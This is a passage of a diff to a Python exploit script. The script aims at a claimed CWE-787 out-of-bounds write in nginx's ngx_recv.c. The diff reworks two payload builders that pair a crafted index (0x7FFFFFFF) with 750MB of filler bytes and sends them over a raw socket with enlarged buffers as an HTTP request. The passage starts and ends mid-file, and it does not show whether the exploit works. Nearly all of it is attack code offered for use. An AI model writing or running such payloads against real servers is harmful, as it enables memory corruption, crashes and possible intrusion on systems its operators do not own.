@@ -151,101 +151,61 @@ def check_container_status(container_id):
 def create_overflow_payload(exploit_type):
     """Create a payload that will trigger the buffer overflow"""
     if exploit_type == 1:
-        # First exploit: Fixed buffer overflow
-        # Create payload with index and data
-        index = 786432000  # 750MB in bytes
-        payload = index.to_bytes(8, byteorder='little')  # 64-bit index
-        payload += b"A" * 786432000  # 750MB of data to write
+        # First exploit: Fixed Buffer Overflow
+        # Create a payload with a large index value
+        target_index = 0x7FFFFFFF  # Target index we want after transformation
+        
+        # Create payload with target index
+        payload = target_index.to_bytes(8, byteorder='little')
+        
+        # Add data that will be copied (750MB)
+        data = bytearray([0x41] * (750 * 1024 * 1024))  # 750MB of 'A's
+        payload += bytes(data)
+        
     else:
-        # Second exploit: Dynamic array overflow
-        # Create payload with array size and index
-        array_size = 16  # Very small array size
-        index = 786432000  # 750MB index
-        payload = array_size.to_bytes(8, byteorder='little')  # Array size
-        payload += index.to_bytes(8, byteorder='little')      # Index
-        payload += b"B" * 786432000  # 750MB of data to write
+        # Second exploit: Dynamic Array Overflow
+        # Create a payload with a large index value
+        target_index = 0x7FFFFFFF  # Target index we want after transformation
+        
+        # Create payload with target index
+        payload = target_index.to_bytes(8, byteorder='little')
+        
+        # Add data that will be copied (750MB)
+        data = bytearray([0x42] * (750 * 1024 * 1024))  # 750MB of 'B's
+        payload += bytes(data)
+    
     return payload
 
 def exploit(host="localhost", port=80, exploit_type=1):
     """Exploit the CWE-787 vulnerability in ngx_recv.c"""
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(30)  # Increase timeout to 30 seconds
+        s.settimeout(300)  # 5 minutes timeout
         s.connect((host, port))
         
         # Set socket options for better performance
         s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8192)
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 8192)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 1024)  # 1GB send buffer
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024 * 1024 * 1024)  # 1GB receive buffer
         
         # Create payload
         payload = create_overflow_payload(exploit_type)
         
         # Prepare HTTP request
-        request = b"POST / HTTP/1.1\r\n"
+        if exploit_type == 1:
+            request = b"GET / HTTP/1.1\r\n"
+        else:
+            request = b"POST / HTTP/1.1\r\n"
+            
         request += b"Host: " + host.encode() + b"\r\n"
         request += b"Content-Type: application/octet-stream\r\n"
         request += b"Content-Length: " + str(len(payload)).encode() + b"\r\n\r\n"
         
         log_message(f"Sending payload for exploit type {exploit_type}...", "DEBUG")
-        if exploit_type == 1:
-            log_message("Using fixed buffer overflow payload (750MB)", "DEBUG")
-        else:
-            log_message("Using dynamic array overflow payload (750MB)", "DEBUG")
         
-        # Send headers first
+        # Send headers and payload
         s.send(request)
-        time.sleep(1)  # Wait for headers to be processed
-        
-        # For exploit type 2, we need to send the payload in parts
-        if exploit_type == 2:
-            # Send array size first
-            array_size = 16
-            s.send(array_size.to_bytes(8, byteorder='little'))
-            time.sleep(0.1)
-            
-            # Send index
-            index = 786432000
-            s.send(index.to_bytes(8, byteorder='little'))
-            time.sleep(0.1)
-            
-            # Send data
-            data = b"B" * 786432000
-        else:
-            data = payload
-        
-        # Send payload in smaller chunks with retries
-        chunk_size = 8192
-        total_sent = 0
-        max_retries = 3
-        
-        while total_sent < len(data):
-            try:
-                chunk = data[total_sent:total_sent + chunk_size]
-                retries = 0
-                
-                while retries < max_retries:
-                    try:
-                        sent = s.send(chunk)
-                        if sent == 0:
-                            log_message("Connection closed by server", "WARNING")
-                            break
-                        total_sent += sent
-                        log_message(f"Sent {total_sent}/{len(data)} bytes", "DEBUG")
-                        time.sleep(0.01)  # Small delay between chunks
-                        break
-                    except socket.error as e:
-                        retries += 1
-                        if retries == max_retries:
-                            raise e
-                        time.sleep(0.1)  # Wait before retry
-                        continue
-                
-            except socket.error as e:
-                log_message(f"Socket error while sending: {e}", "WARNING")
-                break
-        
-        log_message(f"Total bytes sent: {total_sent}", "DEBUG")
+        s.send(payload)
         
         # Try to receive response
         try:
